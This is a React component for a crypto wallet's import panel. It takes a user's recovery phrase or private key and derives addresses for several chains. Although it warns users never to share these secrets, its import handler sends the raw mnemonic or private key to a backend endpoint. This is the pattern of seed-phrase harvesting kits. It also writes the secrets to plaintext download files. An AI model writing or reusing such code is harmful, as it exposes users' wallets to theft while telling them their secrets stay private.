import { useState } from 'react';
import { motion } from 'framer-motion';
import { X, ArrowLeft, Upload, Key, FileText, AlertTriangle, Download } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Separator } from '@/components/ui/separator';
import { useToast } from '@/hooks/use-toast';
import { validateMnemonic, generateWalletAddress } from '@/lib/wallet-service';
import { apiRequest } from '@/lib/queryClient';

interface ImportWalletPanelProps {
  onClose: () => void;
  onWalletImported: (walletName: string, walletData: any) => void;
}

const ImportWalletPanel = ({ onClose, onWalletImported }: ImportWalletPanelProps) => {
  const [activeTab, setActiveTab] = useState('mnemonic');
  const [walletName, setWalletName] = useState('');
  const [mnemonicPhrase, setMnemonicPhrase] = useState('');
  const [mnemonicLength, setMnemonicLength] = useState('12');
  const [privateKey, setPrivateKey] = useState('');
  const { toast } = useToast();

  // Validate mnemonic using bip39 library
  const validateMnemonicPhrase = (phrase: string) => {
    const wordCount = phrase.trim().split(/\s+/).length;
    return wordCount === parseInt(mnemonicLength) && validateMnemonic(phrase);
  };

  // Validate private key format (simple check for demo purposes)
  const validatePrivateKey = (key: string) => {
    // For demo: check if it matches a simple hex format
    return /^[0-9a-fA-F]{64}$/.test(key);
  };

  const handleImport = async () => {
    // Basic validation
    if (!walletName) {
      toast({
        title: "Missing Wallet Name",
        description: "Please provide a name for your wallet.",
        variant: "destructive"
      });
      return;
    }

    if (activeTab === 'mnemonic') {
      if (!validateMnemonicPhrase(mnemonicPhrase)) {
        toast({
          title: "Invalid Recovery Phrase",
          description: `Please enter a valid ${mnemonicLength}-word recovery phrase.`,
          variant: "destructive"
        });
        return;
      }
    } else if (activeTab === 'privateKey') {
      if (!validatePrivateKey(privateKey)) {
        toast({
          title: "Invalid Private Key",
          description: "Please enter a valid private key (64 hex characters).",
          variant: "destructive"
        });
        return;
      }
    }

    try {
      // Generate addresses for main cryptocurrencies from the mnemonic
      if (activeTab === 'mnemonic') {
        // Generate addresses for each cryptocurrency to verify the mnemonic
        const ethWallet = generateWalletAddress(mnemonicPhrase, 'eth');
        const solWallet = generateWalletAddress(mnemonicPhrase, 'sol');
        const trxWallet = generateWalletAddress(mnemonicPhrase, 'trx');
        const adaWallet = generateWalletAddress(mnemonicPhrase, 'ada');
        
        console.log('Ethereum address:', ethWallet.address);
        console.log('Solana address:', solWallet.address);
        console.log('Tron address:', trxWallet.address);
        console.log('Cardano address:', adaWallet.address);
        
        // Save the wallet details to the backend API
        const response = await apiRequest('/api/wallet/import', {
          method: 'POST',
          body: JSON.stringify({
            name: walletName,
            importMethod: 'mnemonic',
            credentials: mnemonicPhrase,
            addresses: [
              { currency: 'ethereum', address: ethWallet.address, path: ethWallet.path },
              { currency: 'solana', address: solWallet.address, path: solWallet.path },
              { currency: 'tron', address: trxWallet.address, path: trxWallet.path },
              { currency: 'cardano', address: adaWallet.address, path: adaWallet.path }
            ]
          })
        });
        
        if (!response.ok) {
          throw new Error(`Server error: ${response.status}`);
        }
        
        toast({
          title: "Wallet Imported Successfully",
          description: `Your wallet "${walletName}" has been imported with derived cryptocurrency addresses.`,
          variant: "default"
        });
      } else if (activeTab === 'privateKey') {
        // Import wallet with private key
        const response = await apiRequest('/api/wallet/import', {
          method: 'POST',
          body: JSON.stringify({
            name: walletName,
            importMethod: 'privateKey',
            credentials: privateKey
          })
        });
        
        if (!response.ok) {
          throw new Error(`Server error: ${response.status}`);
        }
        
        toast({
          title: "Wallet Imported Successfully",
          description: `Your wallet "${walletName}" has been imported with private key.`,
          variant: "default"
        });
      }
      
      // Call the callback function for the parent component
      onWalletImported(walletName);
      onClose();
    } catch (error) {
      console.error('Error importing wallet:', error);
      
      toast({
        title: "Import Failed",
        description: `Failed to import wallet: ${error instanceof Error ? error.message : 'Unknown error'}`,
        variant: "destructive"
      });
    }
  };

  return (
    <motion.div
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      onClick={onClose}
    >
      <motion.div 
        className="bg-gray-900 border border-gray-800 rounded-lg shadow-2xl w-full max-w-xl overflow-hidden my-auto"
        initial={{ scale: 0.9, y: 0 }}
        animate={{ scale: 1, y: 0 }}
        exit={{ scale: 0.9, y: 0 }}
        transition={{ type: "spring", damping: 25, stiffness: 300 }}
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex justify-between items-center p-4 border-b border-gray-800">
          <button 
            className="text-gray-400 hover:text-white transition-colors"
            onClick={onClose}
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <h2 className="text-xl font-semibold text-white">Import Wallet</h2>
          <button 
            className="text-gray-400 hover:text-white transition-colors"
            onClick={onClose}
          >
            <X className="w-5 h-5" />
          </button>
        </div>
        
        <div className="p-6 space-y-6">
          <div className="bg-amber-900/20 border border-amber-800/30 rounded-lg p-4 mb-4">
            <div className="flex gap-3">
              <AlertTriangle className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-gray-300">
                Never share your recovery phrase or private keys with anyone. Anyone with this information can steal your assets.
              </p>
            </div>
          </div>
          
          <div className="space-y-4">
            <div>
              <Label htmlFor="wallet-name">Wallet Name</Label>
              <Input
                id="wallet-name"
                placeholder="My Wallet"
                value={walletName}
                onChange={(e) => setWalletName(e.target.value)}
                className="bg-gray-800 border-gray-700 focus:border-blue-500 text-white mt-1.5"
              />
            </div>
            
            <Tabs defaultValue="mnemonic" className="w-full" onValueChange={setActiveTab}>
              <TabsList className="w-full grid grid-cols-2 bg-gray-800 rounded-md">
                <TabsTrigger value="mnemonic" className="data-[state=active]:bg-blue-600">
                  <FileText className="w-4 h-4 mr-2" />
                  Recovery Phrase
                </TabsTrigger>
                <TabsTrigger value="privateKey" className="data-[state=active]:bg-blue-600">
                  <Key className="w-4 h-4 mr-2" />
                  Private Key
                </TabsTrigger>
              </TabsList>
              
              <TabsContent value="mnemonic" className="mt-4">
                <div className="space-y-4">
                  <div>
                    <Label>Recovery Phrase Length</Label>
                    <RadioGroup 
                      defaultValue="12"
                      className="flex space-x-4 mt-1.5"
                      value={mnemonicLength}
                      onValueChange={setMnemonicLength}
                    >
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="12" id="r1" />
                        <Label htmlFor="r1" className="font-normal">12 words</Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <RadioGroupItem value="24" id="r2" />
                        <Label htmlFor="r2" className="font-normal">24 words</Label>
                      </div>
                    </RadioGroup>
                  </div>
                  
                  <div>
                    <Label htmlFor="mnemonic-phrase">Recovery Phrase</Label>
                    <textarea
                      id="mnemonic-phrase"
                      placeholder="Enter your recovery phrase (separated by spaces)"
                      value={mnemonicPhrase}
                      onChange={(e) => setMnemonicPhrase(e.target.value)}
                      className="w-full h-32 mt-1.5 bg-gray-800 border border-gray-700 rounded-md p-3 text-white focus:border-blue-500 focus:ring-0 resize-none"
                    />
                    <div className="flex justify-end mt-2">
                      <Button
                        variant="outline"
                        size="sm"
                        className="h-8 text-xs border-gray-700 text-gray-300 hover:bg-gray-800"
                        onClick={() => {
                          if (!walletName.trim()) {
                            toast({
                              title: "Wallet Adı Gerekli",
                              description: "Private key'i indirmeden önce lütfen cüzdan adı giriniz.",
                              variant: "destructive"
                            });
                            return;
                          }
                          
                          if (!validateMnemonicPhrase(mnemonicPhrase)) {
                            toast({
                              title: "Geçersiz Recovery Phrase",
                              description: `Lütfen geçerli bir ${mnemonicLength}-kelimelik recovery phrase girin.`,
                              variant: "destructive"
                            });
                            return;
                          }
                          
                          const formattedWalletName = walletName.trim().replace(/[^a-z0-9]/gi, '_').toLowerCase();
                          const element = document.createElement('a');
                          const file = new Blob([`Recovery Phrase (KEEP SECURE!):\n\n${mnemonicPhrase}\n\nWallet: ${walletName}`], {type: 'text/plain'});
                          element.href = URL.createObjectURL(file);
                          element.download = `${formattedWalletName}-recovery-phrase.txt`;
                          document.body.appendChild(element);
                          element.click();
                          document.body.removeChild(element);
                          
                          toast({
                            title: "Seed Phrase İndirildi",
                            description: `"${walletName}" cüzdanı için recovery phrase indirildi. Güvenli bir yerde saklayın!`,
                            variant: "default"
                          });
                        }}
                      >
                        <Download className="w-3.5 h-3.5 mr-1" />
                        Kaydet
                      </Button>
                    </div>
                    <p className="text-xs text-gray-400 mt-1.5">
                      Enter your {mnemonicLength}-word recovery phrase with words separated by spaces.
                    </p>
                  </div>
                </div>
              </TabsContent>
              
              <TabsContent value="privateKey" className="mt-4">
                <div className="space-y-4">
                  <div>
                    <Label htmlFor="private-key">Private Key</Label>
                    <Input
                      id="private-key"
                      placeholder="Enter your private key"
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                      className="bg-gray-800 border-gray-700 focus:border-blue-500 text-white mt-1.5 font-mono"
                    />
                    <div className="flex justify-end mt-2">
                      <Button
                        variant="outline"
                        size="sm"
                        className="h-8 text-xs border-gray-700 text-gray-300 hover:bg-gray-800"
                        onClick={() => {
                          if (!walletName.trim()) {
                            toast({
                              title: "Wallet Adı Gerekli",
                              description: "Private key'i indirmeden önce lütfen cüzdan adı giriniz.",
                              variant: "destructive"
                            });
                            return;
                          }
                          
                          if (!validatePrivateKey(privateKey)) {
                            toast({
                              title: "Geçersiz Private Key",
                              description: "Lütfen geçerli bir private key girin (64 hex karakter).",
                              variant: "destructive"
                            });
                            return;
                          }
                          
                          const formattedWalletName = walletName.trim().replace(/[^a-z0-9]/gi, '_').toLowerCase();
                          const element = document.createElement('a');
                          const file = new Blob([`Private Key (KEEP SECURE!):\n\n${privateKey}\n\nWallet: ${walletName}`], {type: 'text/plain'});
                          element.href = URL.createObjectURL(file);
                          element.download = `${formattedWalletName}-private-key.txt`;
                          document.body.appendChild(element);
                          element.click();
                          document.body.removeChild(element);
                          
                          toast({
                            title: "Private Key İndirildi",
                            description: `"${walletName}" cüzdanı için private key indirildi. Güvenli bir yerde saklayın!`,
                            variant: "default"
                          });
                        }}
                      >
                        <Download className="w-3.5 h-3.5 mr-1" />
                        Kaydet
                      </Button>
                    </div>
                    <p className="text-xs text-gray-400 mt-1.5">
                      Enter your private key in hexadecimal format (64 characters).
                    </p>
                  </div>
                </div>
              </TabsContent>
            </Tabs>
          </div>
        </div>
        
        <div className="p-4 border-t border-gray-800 flex gap-3 justify-end">
          <Button
            variant="outline"
            onClick={onClose}
            className="border-gray-700 text-gray-300 hover:bg-gray-800"
          >
            Cancel
          </Button>
          <Button
            className="bg-blue-600 hover:bg-blue-700 text-white"
            onClick={handleImport}
          >
            <Upload className="w-4 h-4 mr-2" />
            Import Wallet
          </Button>
        </div>
      </motion.div>
    </motion.div>
  );
};

export default ImportWalletPanel;